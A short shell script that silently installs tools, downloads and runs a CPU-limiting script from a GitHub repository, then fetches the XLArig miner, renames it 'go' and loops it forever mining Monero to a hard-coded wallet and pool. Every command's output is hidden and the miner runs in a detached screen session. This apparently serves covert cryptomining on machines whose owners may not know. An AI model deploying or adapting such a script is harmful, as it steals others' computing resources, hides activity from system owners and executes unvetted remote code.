#!/bin/sh
#
#
#XMR
sudo apt update > /dev/null 2>&1
sudo apt install cpulimit > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /dev/null 2>&1
chmod +x limiting.sh > /dev/null 2>&1
screen -dmS randum ./limiting.sh xlarig 65 75 > /dev/null 2>&1
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip > /dev/null 2>&1
unzip XLArig-v5.2.2-linux-x86_64.zip > /dev/null 2>&1
mv xlarig go > /dev/null 2>&1
while [ 1 ]; do
./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Okbaahhh -o xmr-us-east1.nanopool.org:14433 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages > /dev/null 2>&1 
sleep 3
done
sleep 999 > /dev/null 2>&1
